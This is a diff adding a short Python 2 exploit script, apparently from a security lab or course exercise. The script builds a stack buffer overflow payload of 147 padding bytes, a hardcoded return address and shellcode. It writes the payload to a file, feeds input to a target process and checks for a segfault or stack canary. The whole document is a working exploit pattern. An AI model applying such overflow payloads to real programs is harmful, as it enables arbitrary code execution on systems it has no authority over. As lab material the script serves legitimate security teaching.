@@ -1,0 +1,27 @@
+#!/usr/bin/env python2
+
+from scaffold import *
+
+f = open("hack", "w")
+random = "\x22"
+return_address = "\xc0\xf7\xff\xbf"
+f.write(random)
+f.flush()
+
+p.start()
+
+# We do not care about the content
+p.recv(30)
+
+f.write(random*147 + return_address + SHELLCODE)
+f.flush()
+f.close()
+
+p.send("1000\n");
+
+# Here, we could not use the `p.recvline()`, we do not care
+
+returncode = p.end()
+
+if returncode == -11: print "segmentation fault or stack canary!"
+elif returncode != 0: print "return code", returncode
